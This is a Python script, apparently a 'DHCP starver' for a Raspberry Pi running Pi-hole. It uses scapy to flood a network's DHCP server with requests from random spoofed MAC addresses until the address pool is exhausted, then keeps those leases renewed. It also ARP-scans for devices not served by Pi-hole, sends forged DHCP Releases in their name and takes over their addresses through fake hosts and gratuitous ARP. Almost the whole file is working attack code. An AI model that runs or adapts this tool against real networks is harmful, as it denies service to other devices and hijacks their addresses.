#### IMPORTS #### -------------------------------------------------------------------
import scapy.all as scapy
#import nmap
import time
#import json
import threading
#import sched
import netifaces
import logging
from logging.handlers import TimedRotatingFileHandler
#import gzip
#import os
#from datetime import datetime, timedelta # Intervalos de tiempo
#import requests
import random
import ipaddress
#from pyroute2 import IPRoute # Para el modo promiscuo
from datetime import datetime
#from pyroute2.netlink.exceptions import NetlinkError
import sys

#### CONFIG #### -------------------------------------------------------------------
iface = "eth0"  # Network interface to spoof
delay_between_dhcp_packets = 0.5 # seconds
delay_between_arp_scans = 120  # seconds
delay_between_checks_if_ip_renewal_is_necessary = 60 # seconds

finish_program = False # Used to stop loops in async threads

#### GLOBAL VARIABLES #### ---------------------------------------------------------
# Dict of all fake hosts k:MAC, v:fake_host
fake_host_dict = dict()

# Dict of found devices existing on the network
found_devices = {}

# DHCP Server's IP and MAC address
dhcp_server_ip = ""
dhcp_server_mac = ""

# Our own device's network parameters
our_ip_address = ""
our_mac_address = ""
our_netmask = ""
our_network = ""

#### EXTRA GLOBAL STUFF #### ------------------------------------------------------
class fake_host:
    """
    Defines basic parameters of a host
    """
    def __init__(self, mac_address, transaction_id):
        self.ip_address = None
        self.mac_address = mac_address
        self.transaction_id = transaction_id
        self.hostname = "elvispresley"
        self.lease_time = None  # IP Address Lease Time offered by DHCP Server
        self.acquisition_time = None  # Time when IP Address was obtained/renewed
        self.ip_acquired = False  # Sets if this host has adquired successfully the IP Address
    #def __str__(self):
    #    return f"IP: {self.ip_address}, MAC: {self.mac_address}, hostname: {self.hostname}"

# Define a semaphore for .log/.json file access without collision
file_semaphore = threading.Semaphore()
# Define semaphore to wait until IP acquisition is completed for a deauth connected host
#lock = threading.Lock()
#response_received_barrier = threading.Barrier(2, timeout=60)
#response_received_xid = None # Transaction ID for that DORA handshake
#response_received = False

# Replace this with the path to your JSON file
json_file = "/home/pi/dhcp_starver/network_scan_results.json"

# Set up logging with rotation policy
log_file = "/home/pi/dhcp_starver/logs/dhcp_starver.log"
handler = TimedRotatingFileHandler(log_file, when="midnight", interval=1, backupCount=7, encoding='utf-8', utc=True)
handler.suffix = "%Y-%m-%d"
handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger = logging.getLogger()
logger.addHandler(handler)
logger.setLevel(logging.INFO)

# Set up scapy logger to error
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


#### FUNCTIONS #### ----------------------------------------------------------------
def write_to_log(message):
    """
    Write message to log file
    """
    with file_semaphore:
        logger.info(message)


def get_network_params(iface_name):
    """
    Get IP address, MAC address, netmask and network address from selected interface
    Possible iteration: Get that information by listening some packets, idk. 
    """
    try:
        iface = netifaces.ifaddresses(iface_name)
        ip_address = iface[netifaces.AF_INET][0]['addr']
        mac_address = iface[netifaces.AF_LINK][0]['addr']
        network_mask = iface[netifaces.AF_INET][0]['netmask']
        # Obtaining network address
        network_address = ipaddress.ip_network(f"{ip_address}/{network_mask}", strict=False)
        return ip_address, mac_address, network_mask, str(network_address)
    except (KeyError, IndexError):
        return None, None, None


def get_random_mac():
    """
    Returns a string with a "random" MAC address
    """
    mac = "34:" # Our bogus MAC addresses starts with 34 to make it easier to track/debug
    for i in range(10):
        num = random.randint(0, 15)
        if num < 10:
            num = chr(48 + num)
        else:
            num = chr(87 + num)
        mac += num
        if i % 2 == 1:
            mac += ":"
    return mac[:-1]


def get_hosts_from_network(ip_address, netmask):
    """
    Returns a list of all possible assignable IP addresses to hosts on the interface network
    """
    network = ipaddress.IPv4Network(ip_address + "/" + netmask, strict=False)
    # List of avalaible addresses
    address_list = [str(ip_address) for ip_address in network.hosts()] 
    return address_list


def create_fake_host():
    """
    Creates a fake host with random MAC address and Trans ID
    """
    # Getting fresh random MAC addr and transaction ID for all the DHCP transaction process for this fake host
    trans_id = random.getrandbits(32)
    mac_address = get_random_mac()
    # Creating a new fake host with no assigned IP address 
    host = fake_host(mac_address, trans_id)
    return host


def create_dhcp_discover_packet(host):
    """
    Creates a broadcast DHCP Discover with host's parameters
    """
    mac_address = host.mac_address
    trans_id = host.transaction_id
    # Converting MAC address from typical format to a 16 bytes sequence, needed for BOOTP/DHCP header 
    host_mac = int(mac_address.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Discover packet
    ether_header = scapy.Ether(src=host_mac, 
                               dst="ff:ff:ff:ff:ff:ff")
    ip_header = scapy.IP(src="0.0.0.0", 
                         dst="255.255.255.255")
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=host_mac, 
                              xid=trans_id,
                              flags=0) # Unicast
                              #flags=0x8000) # Broadcast
    dhcp_field = scapy.DHCP(options=[("message-type", "discover"),
                                     ("client_id", b'\x01' + host_mac),
                                     ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),  
                                     ("hostname", host.hostname), 
                                     "end"])
    dhcp_discover = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)

    return dhcp_discover


def send_discover(host):
    """
    Send a broadcast DHCP Discover with freshly created fake host's parameters
    """
    dhcp_discover_packet = create_dhcp_discover_packet(host)
    scapy.sendp(dhcp_discover_packet, verbose=False, iface=iface)
    write_to_log(f"Sending DHCP Discover for MAC address {host.mac_address}")

    '''
    mac_address = host.mac_address
    trans_id = host.transaction_id
    # Converting MAC address from typical format to a 16 bytes sequence, needed for BOOTP/DHCP header 
    host_mac = int(mac_address.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Discover packet
    ether_header = scapy.Ether(src=host_mac, 
                               dst="ff:ff:ff:ff:ff:ff")
    ip_header = scapy.IP(src="0.0.0.0", 
                         dst="255.255.255.255")
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=host_mac, 
                              xid=trans_id,
                              flags=0) # Unicast
                              #flags=0x8000) # Broadcast
    dhcp_field = scapy.DHCP(options=[("message-type", "discover"),
                                     ("client_id", b'\x01' + host_mac),
                                     ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),  
                                     ("hostname", host.hostname), 
                                     "end"])
    dhcp_discover = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)

    scapy.sendp(dhcp_discover, verbose=False, iface=iface)
    write_to_log(f"Sending DHCP Discover for MAC address {mac_address}")
    '''


def send_request(host):
    """
    Send a broadcast DHCP Request with requested IP address and spoofed mac address
    """
    trans_id = host.transaction_id
    # Converting MAC address from typical format to a 16 bytes sequence, needed for BOOTP/DHCP header 
    mac_address = int(host.mac_address.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Request packet
    ether_header = scapy.Ether(src=mac_address, 
                               dst="ff:ff:ff:ff:ff:ff")
    ip_header = scapy.IP(src="0.0.0.0", 
                         dst="255.255.255.255")
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=mac_address, 
                              xid=trans_id,
                              flags=0)
    dhcp_field = scapy.DHCP(options=[("message-type", "request"),
                                     ("client_id", b'\x01' + mac_address),
                                     ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),
                                     ("requested_addr", host.ip_address), 
                                     ("hostname", host.hostname),
                                     "end"])
    dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)

    scapy.sendp(dhcp_request, verbose=False, iface=iface)


def send_renewal_request(host):
    """
    Send Unicast DHCP Request for IP address lease renewal
    """
    ip_address = host.ip_address
    trans_id = host.transaction_id
    hostname = host.hostname
    mac_address = host.mac_address
    global dhcp_server_mac
    # Converting MAC address from string typical format to a 16 bytes sequence, needed for BOOTP/DHCP header 
    mac_address = int(mac_address.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Request packet
    ether_header = scapy.Ether(src=mac_address, 
                               dst=dhcp_server_mac)
    ip_header = scapy.IP(src=ip_address, 
                         dst=dhcp_server_ip)
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=mac_address, 
                              ciaddr=ip_address,
                              xid=trans_id,
                              flags=0)
    dhcp_field = scapy.DHCP(options=[("message-type", "request"),
                                     ("client_id", b'\x01' + mac_address),
                                     ("server_id", dhcp_server_ip),
                                     ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),
                                     ("requested_addr", ip_address), 
                                     ("hostname", hostname),
                                     "end"])
    dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)

    scapy.sendp(dhcp_request, verbose=False, iface=iface)


def send_release(host_mac, ip_address):
    """
    Send DHCP Release
    """
    # Getting a random Trans ID
    trans_id = random.getrandbits(32)
    # Converting MAC addresses
    mac_address = int(host_mac.replace(":", ""), 16).to_bytes(6, "big")
    server_mac = int(dhcp_server_mac.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Release packet
    ether_header = scapy.Ether(src=mac_address, 
                               dst=server_mac)
    ip_header = scapy.IP(src=ip_address, 
                         dst=dhcp_server_ip)
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=mac_address,
                              ciaddr=ip_address,
                              xid=trans_id,
                              flags=0)
    dhcp_field = scapy.DHCP(options=[("message-type", "release"),
                                     ("server_id", dhcp_server_ip),
                                     "end"])
    dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)

    scapy.sendp(dhcp_request, verbose=False, iface=iface)
    write_to_log(f"Releasing IP address {ip_address} from {host_mac}")
    # Removing fake_host from dictionary (if release is from a ficticious host)
    #if is_this_mac_ours(host_mac):
    #    global fake_host_dict
    #    del fake_host_dict[host_mac]


def handle_dhcp_packet(packet):
    """
    Handles received DHCP packet
    """
    global fake_host_dict
    global dhcp_server_ip, dhcp_server_mac
    global response_received, response_received_xid

    # Option 2: DHCP Offer (response to Discover)
    if scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 2:
        # Getting client info from BOOTP header - RFC951
        host_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
        host_ip = packet[scapy.BOOTP].yiaddr
        # Check if packet is for us. If not, captured DHCP Offer is discarded
        if not is_this_mac_ours(host_mac):
            return None
        # Updating the fake host's IP address
        fake_host_dict[host_mac].ip_address = host_ip
        # Getting DHCP server info
        dhcp_opts = get_dhcp_options(packet)
        dhcp_server_ip = dhcp_opts["server_id"] 
        dhcp_server_mac = packet[scapy.Ether].src
       
        fake_host = fake_host_dict[host_mac]
        # Send DHCP Request
        send_request(fake_host)
        
    # Option 3: DHCP Request, sent when a device reconnects to network (on broadcast) 
    # Deprecated :'(, now we find existing host with ARP scan 
        '''
    elif scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 3:
        # First check if it's broadcast. Only useful if we're on a mirror port
        if packet[scapy.Ether].dst != "ff:ff:ff:ff:ff:ff":
            return None
        # Obtaining DHCP Options
        dhcp_opts = get_dhcp_options(packet)
        # 
        # global existing_host_dict
        fake_macs = fake_host_dict.keys()
        # existing_macs = existing_host_dict.keys()
        # Getting host's MAC address (sender)
        client_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
        # In received packet is not from any of ours fake hosts, in from a recently reconnected host
        if client_mac not in fake_macs:
            # If host doesn't exist on dictionary, we create it
            host = fake_host(client_mac, packet[scapy.BOOTP].xid)
            # Setting his params
            if dhcp_opts["requested_addr"]:
                host.ip_address = dhcp_opts["requested_addr"]
            else:
                host.ip_address = "0.0.0.0"
            #host.mac_address = client_mac
            host.hostname = dhcp_opts["hostname"].decode('ascii')
            #host.transaction_id = packet[scapy.BOOTP].xid
            # Adding existing host to diccionary
            existing_host_dict[client_mac] = host
            # Sending DHCP Release
            send_release(host.mac_address, host.ip_address)

            # Now we try to get the recently released IP address
            time.sleep(5)
            #send_discover(interface)
            # Create a new ficticious host and adds it to the dictionary
            fake_host = create_fake_host()
            fake_host_dict[fake_host.mac_address] = fake_host
            # Sending discover
            send_discover(fake_host)
            
          '''
    # Option 5: DHCP ACK, IP address successfully linked to host by router's DHCP server        
    elif scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 5:
        # Getting client info - RFC951
        host_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
        host_ip = packet[scapy.BOOTP].yiaddr
        # Check if packet is not for us. Only captured if device is connected to a mirror port or broadcast ACK
        if not is_this_mac_ours(host_mac) or host_mac == our_mac_address:
            write_to_log(f"Received unknown DHCP ACK: {host_ip} linked to {host_mac}")
            return None
        # Updating the fake host's attributes with DHCP server's final decision
        dhcp_opts = get_dhcp_options(packet)
        fake_host_dict[host_mac].ip_address = host_ip
        fake_host_dict[host_mac].lease_time = dhcp_opts['lease_time']
        fake_host_dict[host_mac].acquisition_time = datetime.now()
        fake_host_dict[host_mac].ip_acquired = True
        # Updating DHCP server's params
        dhcp_server_ip = dhcp_opts["server_id"] 
        dhcp_server_mac = packet[scapy.Ether].src
        write_to_log(f"ACK received: {host_ip} successfully linked to {host_mac}")
        #global response_received, response_received_xid
        # Check if this ACK is response to a Catch&Release function
        #if fake_host_dict[host_mac].transaction_id == response_received_xid:
            #global response_received
            #response_received = True
            #global response_received_xid
            #response_received_xid = None
            # Continues with
            #response_received_barrier.wait()
            #response_received_semaphore.release()

    # Option 6: DHCP NAK, unable to obtain a dynamic IP address
    elif scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 6:
        host_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
        write_to_log(f"NAK received!: {host_mac} IP address' acquisition rejected")
        #global response_received, response_received_xid
        # Check if this NAK is response to a Catch&Release function
        #print(f"NAK received: {fake_host_dict[host_mac].transaction_id}.")
        #if fake_host_dict[host_mac].transaction_id == response_received_xid:
            #global response_received
            #response_received = True
            #global response_received_xid
            #response_received_xid = None
        # Check if NAK is for us
        '''
        if is_this_mac_ours(host_mac):
            # Starting again DHCP handshake. Sending new DHCP Discover
            send_discover(fake_host_dict[host_mac])

    else:
        None
        '''
    

def is_this_mac_ours(mac_address):
    """
    Returns true if MAC address belongs to a fake host
    """
    if mac_address in fake_host_dict:
        return True
    else:
        return False


def mac_to_str(bytes_value):
    """
    Converts bytes sequence to standard hex MAC address format (ff:ff:ff:ff:ff:ff)
    """
    hex_string = ''.join('{:02x}'.format(byte) for byte in bytes_value)
    formatted_mac_address = ':'.join(hex_string[i:i+2] for i in range(0, 12, 2))
    return formatted_mac_address


def get_dhcp_options(packet):
    """
    Returns a dict with the DHCP packet's DHCP Options
    """
    dhcp_opts = packet.getlayer(scapy.DHCP).fields["options"]
    dhcp_opts_dict = dict()
    for opt in dhcp_opts:
        # Obtaining all DHCP options until option "end"
        if opt == "end":
            break
        if isinstance(opt, tuple):
            # Ignoring other variables inside a same option, like 2nd DNS Servers, etc. Not useful right now
            dhcp_opts_dict[opt[0]] = opt[1]
        else:
            pass
    return dhcp_opts_dict


def remove_unused_fake_hosts():
    """
    Removes fake hosts with no IP address assigned by DHCP Server
    """
    host_to_remove = []
    global fake_host_dict
    for mac, fake_host in fake_host_dict.items():
        if fake_host.ip_address == None:
            host_to_remove.append(mac)
    for mac in host_to_remove:
        del fake_host_dict[mac]


def is_ip_renew_needed(lease_time, acquisition_time):
    """
    Compares adquisition time and time now to evaluate if an IP renewal is needed
    """
    # Sometimes lease time/acquisition_time are not correctly assigned to fake host. idk
    try:
        threshold = 0.5 * lease_time
        time_diff = datetime.now() - acquisition_time
    except TypeError:
        # Forcing IP renew
        return True
    
    if threshold < time_diff.total_seconds():
        return True
    else:
        return False


def renew_hosts_ip_leases():
    """
    For every fake host, decides if a new DHCP Request is needed to keep IP address linked to host
    """
    #write_to_log(f"Trying IP Lease renewal...")
    for host in fake_host_dict.values():
        if is_ip_renew_needed(host.lease_time, host.acquisition_time) and host.ip_acquired == True:
            # Resetting Transaction ID
            host.transaction_id = random.getrandbits(32)
            # Unicast DHCP Request to renew IP address lease
            send_renewal_request(host)
    #remove_unused_fake_hosts()


def pool_exhaustion_with_discover(number, delay):
    """
    Sends a defined amount of DHCP Discover packets
    """
    for i in range(number):
        time.sleep(delay)
        # Create a new ficticious host and adds it to the dictionary
        fake_host = create_fake_host()
        fake_host_dict[fake_host.mac_address] = fake_host
        # Sending discover
        send_discover(fake_host)
    write_to_log(f"{number} DHCP Discover(s) have been sent")


def pool_exhaustion_with_request(ip_list, delay):
    """
    Sends an DHCP Request for every IP address on ip_list list
    """
    for ip in ip_list:
        time.sleep(delay)
        # Create a new ficticious host and adds it to the dictionary
        fake_host = create_fake_host()
        fake_host.ip_address = ip
        fake_host_dict[fake_host.mac_address] = fake_host
        # Sending request
        send_request(fake_host)
        #print(f"Send Request: {fake_host.transaction_id}.")
        #
        #global response_received_xid, response_received
        #response_received_xid = fake_host.transaction_id
        #while not response_received:
        #    time.sleep(0.5)
        #response_received = False
        


def ip_lease_renewal():
    """
    Performs (if needed) a IP Lease Renewal on all fake hosts every 'renewal_time' seconds
    """
    while not finish_program:
        write_to_log(f"Trying IP Lease renewal. Next attemp in {delay_between_checks_if_ip_renewal_is_necessary} seconds")
        renew_hosts_ip_leases()
        time.sleep(delay_between_checks_if_ip_renewal_is_necessary)
        # Removing hosts with no IP linked
        remove_unused_fake_hosts()

            
def release_all_ips():
    """
    Sends a DHCP Release for every fake host with an IP address linked
    """
    for host in fake_host_dict.values():
        if host.ip_acquired:
            send_release(host.mac_address, host.ip_address)
            time.sleep(0.25)
    write_to_log(f"All IP addresses have been released!")
    

def perform_arp_scan(network_ip_addresses):
    """
    Perform an ARP scan to targeted IP addresses
    """
    while not finish_program:
        write_to_log(f"Starting ARP Request scan. Next scan in {delay_between_arp_scans} seconds.")
        # Get a list with non spoofed host's IP addresses
        target_ips = get_unspoofed_ips(network_ip_addresses)
        ip_mac_data = arp_scan(target_ips)
        # Getting Pi-hole DHCP Server's IP lease list
        spoofed_hosts = get_dhcp_leases()
        # Updating json file
        #global found_devices
        #found_devices = update_device_info(ip_mac_data, found_devices, spoofed_hosts)
        #save_results_to_json(found_devices, json_file)
        
        for ip, mac in ip_mac_data:
            # Checking if discovered host is not DHCP server or not already spoofed
            #if ip != dhcp_server_ip and mac not in spoofed_hosts.keys():
            # Skip if IP address belongs to DHCP Server
            #if ip != dhcp_server_ip:
                #write_to_log(f"ARP Scan: Found non-spoofed host {ip} - {mac}")
                # Try to release that host IP address and kidnap it
                #release_and_catch(mac, ip)
            # Checking if discovered host is not already spoofed
            if mac not in spoofed_hosts.keys():
                write_to_log(f"ARP Scan: Found non-spoofed host {ip} - {mac}")
                # Try to release that host IP address and kidnap it
                release_and_catch(mac, ip)
        # Wait and update json with new spoofed devices
        #time.sleep(10)
        #global found_devices
        #found_devices = update_device_info(ip_mac_data, found_devices, spoofed_hosts)
        #save_results_to_json(found_devices, json_file)
        time.sleep(delay_between_arp_scans)


def get_unspoofed_ips(network_ip_addresses):
    """
    Compares avalaible ip addresses with spoofed ips to return a list with non spoofed IP addresses
    """
    try:
        # Removing DHCP Server IP address from avalaible addresses
        network_ip_addresses.remove(dhcp_server_ip)

        # Iterating for every fake_host in the dictionary
        for _, fake_host in fake_host_dict.items():
            # If bogus host has acquired an IP address, that address is removed from all IP addresses list
            if fake_host.ip_acquired:
                network_ip_addresses.remove(fake_host.ip_address)
        return network_ip_addresses
        '''
        fake_hosts_ips = []

        # Obtaining every bogus host
        for _ , fake_host in fake_host_dict.items():
            if fake_host.ip_acquired:
                fake_hosts_ips.append(fake_host.ip_address)

        all_ips = set(network_ip_addresses)
        spoofed_ips = set(fake_hosts_ips)
        
        # Obtain the IP addresses that not exist in spoofed_ips
        non_spoofed_ips = list(all_ips - spoofed_ips)

        return non_spoofed_ips
        '''
    except:
        # If an error occurs, return the whole address list
        return network_ip_addresses


def release_and_catch(host_mac, host_ip):
    """
    Release device's IP address and try to assign it to a fake host
    """
    # Send DHCP Release to force a new IP address adquisition by the host
    send_release(host_mac, host_ip)
    # Wait for t seconds and try to catch that released IP address
    time.sleep(5)
    # Create a new ficticious host and adds it to the dictionary
    fake_host = create_fake_host()
    global fake_host_dict
    fake_host_dict[fake_host.mac_address] = fake_host
    # Sending discover
    send_discover(fake_host)
    # Setting xid for detecting ACK
    #global response_received_xid
    #response_received_xid = fake_host.transaction_id
    # Waits until IP acquisition is completed
    #response_received_semaphore.acquire(timeout=60)
    #response_received_barrier.wait()

    send_gratuitous_arp(fake_host.mac_address, host_ip)
    '''
    # Performs a DORA handshake to get that released IP address. Waits until a response is received
    if perform_dora_handshake(fake_host):
        # If IP is acquired, we announce that
        send_gratuitous_arp(fake_host.mac_address, host_ip)
    else:
        send_discover(fake_host)
    '''


    '''
def perform_dora_handshake(host):
    """
    Performs a Discover-Offer-Request-ACK handshake. Retuns True if ACK, False if NAK
    """
    result, _ = scapy.srp(create_dhcp_discover_packet(host), timeout=30, verbose=False)

    _, received = result
    
    return True
    '''


def send_gratuitous_arp(host_mac, host_ip):
    """
    Send an ARP Request announcing defined IP-MAC association
    """
    ether_header = scapy.Ether(src=host_mac, 
                               dst="ff:ff:ff:ff:ff:ff")
    arp_header = scapy.ARP(op=2, # 1=Request, 2=Reply 
                           pdst=host_ip, 
                           psrc=host_ip, 
                           hwsrc=host_mac)
    arp_request = ether_header/arp_header
    # Send 3 Gratuitous ARPs trying to force an IP renewal on the connected device
    for _ in range(3):
        scapy.sendp(arp_request, verbose=False, iface=iface)
    write_to_log(f"Sending Gratuitous ARP announcing {host_mac} - {host_ip}")

'''
def arp_scan(network):
    
    """
    Performs a nmap ARP request scan to find existing hosts on the network
    """
    nm = nmap.PortScanner()
    try:
        nm.scan(hosts=network, arguments='-sP -PR')
        # For every found host creates a duple IP Address - MAC Address, adds it to a dictionary
        ip_mac_data = [(x, nm[x]['addresses']['mac'].lower()) for x in nm.all_hosts() if 'mac' in nm[x]['addresses']]
        return ip_mac_data
    except Exception as e:
        write_to_log(f"Error during ARP scan: {e}")
        return None
'''
def arp_scan(target_ips):
    """
    Performs a nmap ARP request scan to find existing hosts on the network on target ip addresses
    """
    # ARP Request packet, one for every unspoofed ip address
    arp_requests = [scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip) for ip in target_ips]

    result, _ = scapy.srp(arp_requests, timeout=5, verbose=False)

    # List to save responding hosts' (IP, MAC) tuples
    responsive_ips = []

    # For every response, checks if it's an ARP response and saves the responding host params
    for _ , received in result:
        if received.haslayer(scapy.ARP):
            ip_address = received.psrc
            mac_address = received.hwsrc
            responsive_ips.append((ip_address, mac_address.lower()))
    return responsive_ips
    """
    nm = nmap.PortScanner()
    try:
        '''
        for ip in target_ips:
            nm.scan(hosts=ip, arguments='-sP -PR')
            # For every found host creates a duple IP Address - MAC Address, adds it to a dictionary
            ip_mac_data = [(x, nm[x]['addresses']['mac'].lower()) for x in nm.all_hosts() if 'mac' in nm[x]['addresses']]
        return ip_mac_data
        '''
        nm.scan(hosts=target_ips, arguments='-sP -PR')
        # For every found host creates a duple IP Address - MAC Address, adds it to a dictionary
        ip_mac_data = [(x, nm[x]['addresses']['mac'].lower()) for x in nm.all_hosts() if 'mac' in nm[x]['addresses']]
        return ip_mac_data
    except Exception as e:
        write_to_log(f"Error during ARP scan: {e}")
        return None
    """

def get_dhcp_leases():
    """
    Reads /etc/pihole/dhcp.leases and loads it to a dictionary
    """
    dhcp_leases = {}
    with open("/etc/pihole/dhcp.leases", 'r') as f:
        for line in f:
            parts = line.strip().split()
            if len(parts) >= 5:
                #timestamp = parts[0]
                mac_address = parts[1]
                ip_address = parts[2]
                hostname = parts[3]
                #if len(parts) > 4:
                #    hostname += " " + " ".join(parts[4:])
                #dhcp_leases[mac_address] = {'timestamp': timestamp, 'ip_address': ip_address, 'hostname': hostname}
                dhcp_leases[mac_address] = {'ip_address': ip_address, 'hostname': hostname}
    return dhcp_leases

'''
def save_results_to_json(results, file_path):
    """
    Saves found devices to json file
    """
    with file_semaphore:
        with open(file_path, 'w') as json_file:
            json.dump(results, json_file, indent=2)


def get_vendor_by_mac(mac_address):
    """
    Gets device vendor by checking MAC address on macvendors.com 
    """
    api_url = f'https://api.macvendors.com/{mac_address}'
    try:
        response = requests.get(api_url)
        if response.status_code == 200:
            return response.text.strip()
        #else:
        #    print(f"Request failed with status code: {response.status_code}")
    except requests.exceptions.RequestException:
        #print(f"Request failed with exception: {e}")
        pass
    return 'Unknown Vendor'


def update_device_info(ip_mac_data, previous_results, spoofed_hosts):
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    for ip, mac in ip_mac_data:
        time.sleep(0.5)
        # Check if its router
        is_router = mac == dhcp_server_mac
        # Check if the device is spoofed. Comparing IP-MAC assigment with Pihole's DHCP server leases
        is_spoofed = mac in spoofed_hosts and ip == spoofed_hosts[mac]['ip_address']    
        # If the device was discovered in a previous scan
        if ip in previous_results:
            # If the IP and MAC of the previous data are different, we perform a complete update
            if previous_results[ip]['mac'] != mac:
                previous_results[ip].update({'mac': mac, 'vendor': get_vendor_by_mac(mac), 'last_seen': current_time, 'is_router': is_router, 'hostname': '-', 'is_spoofed': is_spoofed})
            else:
                # The device was already in the file and MAC and IP concurs
                previous_results[ip].update({'last_seen': current_time})
                previous_results[ip].update({'is_spoofed': is_spoofed})
        else:
            # Add new device entry
            previous_results[ip] = {'mac': mac, 'vendor': get_vendor_by_mac(mac), 'last_seen': current_time, 'is_router': is_router, 'hostname': '-', 'is_spoofed': is_spoofed}

    return previous_results
'''

def main():
    # Network interface to spoof. "eth0" is standard Ethernet interface on Raspi
    write_to_log(f"Starting service on interface {iface}")

    # Getting interface parameters
    global our_ip_address, our_mac_address, our_netmask, our_network
    our_ip_address, our_mac_address, our_netmask, our_network = get_network_params(iface)
    
    # Getting all host avalaible IP addresses for network
    avalaible_hosts = get_hosts_from_network(our_ip_address, our_netmask)
    max_hosts = len(avalaible_hosts) - 1
    write_to_log(f"Interface {iface} has IPaddr: {our_ip_address}, MACaddr: {our_mac_address} and netmask: {our_netmask}")
    write_to_log(f"There's a total of {max_hosts} possible hosts")

    # Starting asynchronous DHCP packet sniffer
    dhcp_sniffer = scapy.AsyncSniffer(filter="udp and (port 67 or 68)", prn=handle_dhcp_packet)
    dhcp_sniffer.start()

    # Pool exhaustion: getting all avalaible IP from DHCP server's pool
    pool_exhaustion_with_request(avalaible_hosts, delay_between_dhcp_packets)
    time_to_wait_to_receive_all_ack = 30  # seconds
    # If no ACK is received, DHCP server's IP address can't be catched. Trying more reliable (and slow) exhaustion with DORA handshake
    if dhcp_server_ip == "":
        write_to_log(f"Pool exhaustion with DHCP Request failed. Trying exhaustion with DHCP Discover")
        remove_unused_fake_hosts()
        pool_exhaustion_with_discover(max_hosts, delay_between_dhcp_packets)
    write_to_log(f"Waiting {time_to_wait_to_receive_all_ack} second(s) for the rest of DHCP ACK to be received")
    time.sleep(time_to_wait_to_receive_all_ack)

    try:
        arp_scan_thread = threading.Thread(target=perform_arp_scan, args=(avalaible_hosts,))
        ip_lease_renewal_thread = threading.Thread(target=ip_lease_renewal)

        arp_scan_thread.start()
        ip_lease_renewal_thread.start()

        arp_scan_thread.join()
        ip_lease_renewal_thread.join()

    except Exception as e:
        # If an exception occurs (p.e. KeyboardInterrupt Ctrl+C) all IP's will be released
        # Stop infinite loop on the threads
        global finish_program
        finish_program = True
        # Stop all threads
        arp_scan_thread.stop()
        ip_lease_renewal_thread.stop()
        sys.exit(0)

    finally:
        # Releasing all IP addresses
        release_all_ips()
    

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt as e:
        write_to_log(f"Service terminated")

